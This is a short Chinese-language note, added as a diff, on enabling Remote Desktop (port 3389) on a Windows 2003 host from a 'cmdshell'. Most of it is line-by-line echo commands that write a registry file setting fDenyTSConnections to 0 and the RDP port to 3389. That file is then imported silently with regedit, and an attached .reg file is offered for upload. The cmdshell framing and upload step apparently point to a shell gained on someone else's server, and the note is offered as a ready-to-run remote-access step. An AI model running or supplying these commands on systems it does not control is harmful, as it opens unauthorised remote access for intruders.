@@ -1,0 +1,13 @@
+开3389
+2003cmdshell下开启远程桌面服务，用"echo"命令写入一个 3389.reg文件，再"regedit /s 3389.reg"导入注册表文件即可开启。将如下代码一行一行地复制到shell终端后按回车执行：
+
+    echo Windows Registry Editor Version 5.00 >3389.reg 
+　　echo. >>3389.reg 
+　　echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server] >>3389.reg 
+　　echo "fDenyTSConnections"=dword:00000000 >>3389.reg 
+　　echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp] >>3389.reg 
+　　echo "PortNumber"=dword:00000d3d >>3389.reg 
+　　echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp] >>3389.reg 
+　　echo "PortNumber"=dword:00000d3d >>3389.reg 
+将如上代码一行一行地复制到cmdshell窗口后按回车执行
+或者使用我附件的3389.reg 直接上传 执行时执行注意路径"regedit /s 3389.reg"
